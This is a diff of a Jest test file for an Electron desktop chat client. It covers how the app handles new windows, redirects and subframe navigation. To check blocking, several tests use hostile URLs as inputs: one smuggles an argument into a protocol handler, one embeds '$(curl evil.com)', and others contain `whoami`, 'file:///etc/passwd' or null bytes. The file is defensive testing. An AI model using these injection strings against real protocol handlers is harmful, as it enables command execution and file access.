@@ -3,29 +3,32 @@
 
 'use strict';
 
-import {dialog, shell, BrowserWindow} from 'electron';
+import {BrowserWindow} from 'electron';
 
+import MessageModal from 'app/mainWindow/modals/messageModal';
 import NavigationManager from 'app/navigationManager';
 import WebContentsManager from 'app/views/webContentsManager';
 import {getLevel} from 'common/log';
 import ContextMenu from 'main/contextMenu';
+import LocalNetworkAccessManager from 'main/security/localNetworkAccess';
+import {openExternalSafely} from 'main/utils';
 
 import PluginsPopUpsManager from './pluginsPopUps';
 import {WebContentsEventManager} from './webContentEvents';
-import {generateHandleConsoleMessage} from './webContentEventsCommon';
+import {generateHandleConsoleMessage, showInvalidLinkModal} from './webContentEventsCommon';
 
 import allowProtocolDialog from '../../main/security/allowProtocolDialog';
 
 jest.mock('electron', () => ({
     app: {},
-    dialog: {
-        showErrorBox: jest.fn(),
-    },
-    shell: {
-        openExternal: jest.fn(),
-    },
     BrowserWindow: jest.fn(),
     session: {},
+}));
+jest.mock('app/mainWindow/modals/messageModal', () => ({
+    __esModule: true,
+    default: {
+        showErrorModal: jest.fn(),
+    },
 }));
 jest.mock('main/contextMenu', () => jest.fn());
 jest.mock('app/mainWindow/mainWindow', () => ({
@@ -40,10 +43,20 @@ jest.mock('common/views/viewManager', () => ({
 
 jest.mock('app/views/pluginsPopUps', () => ({
     handleNewWindow: jest.fn(() => ({action: 'allow'})),
+    generateHandleCreateWindow: jest.fn(() => jest.fn()),
+}));
+
+jest.mock('main/security/localNetworkAccess', () => ({
+    __esModule: true,
+    default: {
+        registerWebContents: jest.fn(),
+        unregisterWebContents: jest.fn(),
+    },
 }));
 
 jest.mock('main/utils', () => ({
     composeUserAgent: jest.fn(),
+    openExternalSafely: jest.fn(),
 }));
 
 jest.mock('common/config', () => ({
@@ -129,6 +142,107 @@ describe('main/views/webContentsEvents', () => {
         });
     });
 
+    describe('addWebContentsEventListeners', () => {
+        const setupContents = () => {
+            const handlers = {};
+            const contents = {
+                id: 1,
+                on: jest.fn((eventName, handler) => {
+                    handlers[eventName] = handler;
+                }),
+                once: jest.fn(),
+                removeListener: jest.fn(),
+                setWindowOpenHandler: jest.fn(),
+            };
+            return {handlers, contents};
+        };
+
+        it('should attach distinct main-frame and subframe navigation guards and remove both', () => {
+            const webContentsEventManager = new WebContentsEventManager();
+            const {handlers, contents} = setupContents();
+
+            webContentsEventManager.addWebContentsEventListeners(contents);
+
+            expect(contents.on).toHaveBeenCalledWith('will-navigate', expect.any(Function));
+            expect(contents.on).toHaveBeenCalledWith('will-frame-navigate', expect.any(Function));
+            expect(contents.on).toHaveBeenCalledWith('will-redirect', expect.any(Function));
+
+            // Distinct from will-navigate so a main-frame navigation is not processed twice.
+            expect(handlers['will-frame-navigate']).not.toBe(handlers['will-navigate']);
+
+            webContentsEventManager.removeWebContentsListeners(1);
+
+            expect(contents.removeListener).toHaveBeenCalledWith('will-navigate', handlers['will-navigate']);
+            expect(contents.removeListener).toHaveBeenCalledWith('will-frame-navigate', handlers['will-frame-navigate']);
+            expect(contents.removeListener).toHaveBeenCalledWith('will-redirect', handlers['will-redirect']);
+        });
+
+        it('redirect guard applies the main-frame policy to main-frame redirects', () => {
+            const webContentsEventManager = new WebContentsEventManager();
+            webContentsEventManager.getServerURLFromWebContentsId = () => new URL('http://server-1.com');
+            const {handlers, contents} = setupContents();
+            webContentsEventManager.addWebContentsEventListeners(contents);
+            const willRedirect = handlers['will-redirect'];
+
+            const internalEvent = {preventDefault: jest.fn(), isMainFrame: true, url: 'http://server-1.com/subpath'};
+            willRedirect(internalEvent, internalEvent.url);
+            expect(internalEvent.preventDefault).not.toHaveBeenCalled();
+
+            const externalEvent = {preventDefault: jest.fn(), isMainFrame: true, url: 'http://someotherurl.com'};
+            willRedirect(externalEvent, externalEvent.url);
+            expect(externalEvent.preventDefault).toHaveBeenCalled();
+        });
+
+        it('redirect guard applies the subframe policy to subframe redirects', () => {
+            const webContentsEventManager = new WebContentsEventManager();
+            webContentsEventManager.getServerURLFromWebContentsId = () => new URL('http://server-1.com');
+            const {handlers, contents} = setupContents();
+            webContentsEventManager.addWebContentsEventListeners(contents);
+            const willRedirect = handlers['will-redirect'];
+
+            // External redirects are how ordinary embeds work, so they stay allowed for subframes.
+            const embedEvent = {preventDefault: jest.fn(), isMainFrame: false, url: 'https://www.youtube.com/embed/abc'};
+            willRedirect(embedEvent, embedEvent.url);
+            expect(embedEvent.preventDefault).not.toHaveBeenCalled();
+
+            const protocolEvent = {preventDefault: jest.fn(), isMainFrame: false, url: 'custom://payload'};
+            willRedirect(protocolEvent, protocolEvent.url);
+            expect(protocolEvent.preventDefault).toHaveBeenCalled();
+        });
+
+        it('subframe guard ignores main-frame navigations (handled by will-navigate)', () => {
+            const webContentsEventManager = new WebContentsEventManager();
+            const {handlers, contents} = setupContents();
+            webContentsEventManager.addWebContentsEventListeners(contents);
+
+            const frameEvent = {preventDefault: jest.fn(), isMainFrame: true, url: 'https://example.com/anything'};
+            handlers['will-frame-navigate'](frameEvent);
+
+            expect(frameEvent.preventDefault).not.toHaveBeenCalled();
+        });
+
+        it('subframe guard allows web embeds (http/https/about) but blocks other protocols', () => {
+            const webContentsEventManager = new WebContentsEventManager();
+            const {handlers, contents} = setupContents();
+            webContentsEventManager.addWebContentsEventListeners(contents);
+            const willFrameNavigate = handlers['will-frame-navigate'];
+
+            const allowed = ['https://www.youtube.com/embed/abc', 'http://example.com/widget', 'about:blank', 'about:srcdoc'];
+            allowed.forEach((url) => {
+                const ev = {preventDefault: jest.fn(), isMainFrame: false, url};
+                willFrameNavigate(ev);
+                expect(ev.preventDefault).not.toHaveBeenCalled();
+            });
+
+            const blocked = ['tel:+15551234', 'mailto:user@example.com', 'custom://payload', 'file:///etc/passwd'];
+            blocked.forEach((url) => {
+                const ev = {preventDefault: jest.fn(), isMainFrame: false, url};
+                willFrameNavigate(ev);
+                expect(ev.preventDefault).toHaveBeenCalled();
+            });
+        });
+    });
+
     describe('newWindow', () => {
         const webContentsEventManager = new WebContentsEventManager();
         const newWindow = webContentsEventManager.generateNewWindowListener(1, true);
@@ -160,18 +274,25 @@ describe('main/views/webContentsEvents', () => {
         });
         it('should deny and show dialog on bad URL', () => {
             expect(newWindow({url: 'a-bad<url'})).toStrictEqual({action: 'deny'});
-            expect(dialog.showErrorBox).toHaveBeenCalled();
+            expect(MessageModal.showErrorModal).toHaveBeenCalled();
         });
 
         it('should open URLs with non-standard characters externally', () => {
             expect(newWindow({url: 'https://google.com/?^'})).toStrictEqual({action: 'deny'});
-            expect(shell.openExternal).toBeCalledWith('https://google.com/?^');
+            expect(openExternalSafely).toBeCalledWith('https://google.com/?^', showInvalidLinkModal);
         });
 
         it('should open MS Teams URLs with curly braces in query string', () => {
             const teamsUrl = 'https://teams.microsoft.com/l/message/19:meeting_abc@thread.v2/123?context={%22contextType%22:%22chat%22}';
             expect(newWindow({url: teamsUrl})).toStrictEqual({action: 'deny'});
-            expect(shell.openExternal).toBeCalledWith(teamsUrl);
+            expect(openExternalSafely).toBeCalledWith(teamsUrl, showInvalidLinkModal);
+        });
+
+        it('should deny and show dialog when the URL cannot be opened externally', () => {
+            openExternalSafely.mockImplementationOnce((url, onError) => onError(new Error('Invalid URL')));
+            expect(newWindow({url: 'https://example.com}'})).toStrictEqual({action: 'deny'});
+            expect(openExternalSafely).toBeCalledWith('https://example.com}/', showInvalidLinkModal);
+            expect(MessageModal.showErrorModal).toHaveBeenCalled();
         });
 
         it('should allow dev tools to open', () => {
@@ -186,58 +307,57 @@ describe('main/views/webContentsEvents', () => {
         it('should divert to allowProtocolDialog for custom protocols that are not mattermost or http', () => {
             const url = 'spotify:album:2OZbaW9tgO62ndm375lFZr';
             expect(newWindow({url})).toStrictEqual({action: 'deny'});
-            expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
+            expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url, undefined);
         });
-
         describe('should block malicious URLs', () => {
             it('should sanitize argument injection before passing to protocol dialog', () => {
                 const maliciousUrl = String.raw`customproto:///" --data-dir "\\deans-mbp\mattermost`;
                 expect(newWindow({url: maliciousUrl})).toStrictEqual({action: 'deny'});
-                expect(shell.openExternal).not.toBeCalled();
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(maliciousUrl);
+                expect(openExternalSafely).not.toBeCalled();
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(maliciousUrl, undefined);
             });
 
             it('should reject UNC paths with no scheme and show dialog', () => {
                 const uncPath = String.raw`\\server\share\file.exe`;
                 expect(newWindow({url: uncPath})).toStrictEqual({action: 'deny'});
-                expect(dialog.showErrorBox).toHaveBeenCalled();
-                expect(shell.openExternal).not.toBeCalled();
+                expect(MessageModal.showErrorModal).toHaveBeenCalled();
+                expect(openExternalSafely).not.toBeCalled();
                 expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
             });
 
             it('should route file: protocol through confirmation dialog', () => {
                 const url = 'file:///etc/passwd';
                 expect(newWindow({url})).toStrictEqual({action: 'deny'});
-                expect(shell.openExternal).not.toBeCalled();
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
+                expect(openExternalSafely).not.toBeCalled();
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url, undefined);
             });
 
             it('should reject URLs with literal null bytes and show dialog', () => {
                 expect(newWindow({url: 'customproto:///path\x00malicious'})).toStrictEqual({action: 'deny'});
-                expect(dialog.showErrorBox).toHaveBeenCalled();
-                expect(shell.openExternal).not.toBeCalled();
+                expect(MessageModal.showErrorModal).toHaveBeenCalled();
+                expect(openExternalSafely).not.toBeCalled();
                 expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
             });
 
             it('should reject URLs with percent-encoded null bytes and show dialog', () => {
                 expect(newWindow({url: 'customproto:///path%00malicious'})).toStrictEqual({action: 'deny'});
-                expect(dialog.showErrorBox).toHaveBeenCalled();
-                expect(shell.openExternal).not.toBeCalled();
+                expect(MessageModal.showErrorModal).toHaveBeenCalled();
+                expect(openExternalSafely).not.toBeCalled();
                 expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
             });
 
             it('should reject completely malformed URIs with no scheme and show dialog', () => {
                 expect(newWindow({url: 'not-a-url-at-all'})).toStrictEqual({action: 'deny'});
-                expect(dialog.showErrorBox).toHaveBeenCalled();
-                expect(shell.openExternal).not.toBeCalled();
+                expect(MessageModal.showErrorModal).toHaveBeenCalled();
+                expect(openExternalSafely).not.toBeCalled();
                 expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
             });
 
             it('should reject oversized URLs from window.open and show dialog', () => {
                 const oversizedURL = `http://example.com/${'A'.repeat(1000000)}`;
                 expect(newWindow({url: oversizedURL})).toStrictEqual({action: 'deny'});
-                expect(dialog.showErrorBox).toHaveBeenCalled();
-                expect(shell.openExternal).not.toBeCalled();
+                expect(MessageModal.showErrorModal).toHaveBeenCalled();
+                expect(openExternalSafely).not.toBeCalled();
                 expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
             });
         });
@@ -246,22 +366,22 @@ describe('main/views/webContentsEvents', () => {
             it('should percent-encode backticks', () => {
                 const url = 'customproto:///path/`whoami`';
                 expect(newWindow({url})).toStrictEqual({action: 'deny'});
-                expect(shell.openExternal).not.toBeCalled();
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
+                expect(openExternalSafely).not.toBeCalled();
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url, undefined);
             });
 
             it('should encode spaces in $() shell expansion patterns', () => {
                 const url = 'customproto:///$(curl evil.com)';
                 expect(newWindow({url})).toStrictEqual({action: 'deny'});
-                expect(shell.openExternal).not.toBeCalled();
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
+                expect(openExternalSafely).not.toBeCalled();
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url, undefined);
             });
 
             it('should preserve double-encoded values without double-decoding', () => {
                 const url = 'customproto:///path%2520with%2520spaces';
                 expect(newWindow({url})).toStrictEqual({action: 'deny'});
-                expect(shell.openExternal).not.toBeCalled();
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
+                expect(openExternalSafely).not.toBeCalled();
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url, undefined);
             });
         });
 
@@ -269,13 +389,13 @@ describe('main/views/webContentsEvents', () => {
             it('should lowercase the scheme for ONENOTE:', () => {
                 const url = 'ONENOTE:///path';
                 expect(newWindow({url})).toStrictEqual({action: 'deny'});
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url, undefined);
             });
 
             it('should lowercase the scheme for mixed case OneNote:', () => {
                 const url = 'OneNote:///path';
                 expect(newWindow({url})).toStrictEqual({action: 'deny'});
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url, undefined);
             });
         });
 
@@ -283,42 +403,42 @@ describe('main/views/webContentsEvents', () => {
             it('should allow OneNote URLs with curly braces', () => {
                 const onenoteUrl = 'onenote:///D:/OneNote/Apps/Test.one#Page&page-id={840EDD0C-B6FB-481E-A342-E39AEDA50EE6}';
                 expect(newWindow({url: onenoteUrl})).toStrictEqual({action: 'deny'});
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(onenoteUrl);
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(onenoteUrl, undefined);
             });
 
             it('should allow OneNote URLs with backslashes', () => {
                 const onenoteUrl = String.raw`onenote:///D:\OneNote\Apps\Mattermost.one#Sch%C3%B6ne%20neue%20Seite&page-id={840EDD0C-B6FB-481E-A342-E39AEDA50EE6}`;
                 expect(newWindow({url: onenoteUrl})).toStrictEqual({action: 'deny'});
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(onenoteUrl);
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(onenoteUrl, undefined);
             });
 
             it('should allow OneNote URLs with unicode and emoji', () => {
                 const onenoteUrl = 'onenote:///C:/notebook/section.one#Schöne%20Seite%20🌞';
                 expect(newWindow({url: onenoteUrl})).toStrictEqual({action: 'deny'});
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(onenoteUrl);
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(onenoteUrl, undefined);
             });
 
             it('should allow SharePoint URLs', () => {
                 const sharepointUrl = 'ms-word:ofe|u|https://company.sharepoint.com/sites/team/Documents/file.docx';
                 expect(newWindow({url: sharepointUrl})).toStrictEqual({action: 'deny'});
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(sharepointUrl);
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(sharepointUrl, undefined);
             });
         });
 
         it('should open in the browser when there is no server matching', () => {
             WebContentsManager.getViewByWebContentsId.mockReturnValue(undefined);
             expect(newWindow({url: 'http://server-2.com/subpath'})).toStrictEqual({action: 'deny'});
-            expect(shell.openExternal).toBeCalledWith('http://server-2.com/subpath');
+            expect(openExternalSafely).toBeCalledWith('http://server-2.com/subpath', showInvalidLinkModal);
         });
 
         it('should open public file links in browser', () => {
             expect(newWindow({url: 'http://server-1.com/api/v4/public/files/myfile.img'})).toStrictEqual({action: 'deny'});
-            expect(shell.openExternal).toBeCalledWith('http://server-1.com/api/v4/public/files/myfile.img');
+            expect(openExternalSafely).toBeCalledWith('http://server-1.com/api/v4/public/files/myfile.img', showInvalidLinkModal);
         });
 
         it('should open help links in the browser', () => {
             expect(newWindow({url: 'http://server-1.com/help/helplink'})).toStrictEqual({action: 'deny'});
-            expect(shell.openExternal).toBeCalledWith('http://server-1.com/help/helplink');
+            expect(openExternalSafely).toBeCalledWith('http://server-1.com/help/helplink', showInvalidLinkModal);
         });
 
         it('should open team links in the app', () => {
@@ -338,6 +458,7 @@ describe('main/views/webContentsEvents', () => {
         it('should open popup window for plugins', () => {
             expect(newWindow({url: 'http://server-1.com/plugins/myplugin/login'})).toStrictEqual({action: 'deny'});
             expect(webContentsEventManager.popupWindow).toBeTruthy();
+            expect(jest.mocked(LocalNetworkAccessManager.registerWebContents)).toHaveBeenCalled();
         });
 
         it('should open popup window for managed resources', () => {
@@ -347,7 +468,7 @@ describe('main/views/webContentsEvents', () => {
 
         it('should open external URIs in browser', () => {
             expect(newWindow({url: 'https://google.com'})).toStrictEqual({action: 'deny'});
-            expect(shell.openExternal).toBeCalledWith('https://google.com/');
+            expect(openExternalSafely).toBeCalledWith('https://google.com/', showInvalidLinkModal);
         });
 
         it('should dispose context menu when popup window closes', () => {
@@ -361,6 +482,7 @@ describe('main/views/webContentsEvents', () => {
                 show: jest.fn(),
                 loadURL: jest.fn(),
                 webContents: {
+                    id: 99,
                     on: jest.fn(),
                     setWindowOpenHandler: jest.fn(),
                 },
@@ -374,6 +496,7 @@ describe('main/views/webContentsEvents', () => {
             expect(closedCallback).toBeDefined();
 
             closedCallback();
+            expect(jest.mocked(LocalNetworkAccessManager.unregisterWebContents)).toHaveBeenCalledWith(99);
             expect(mockContextMenu.dispose).toHaveBeenCalled();
         });
     });
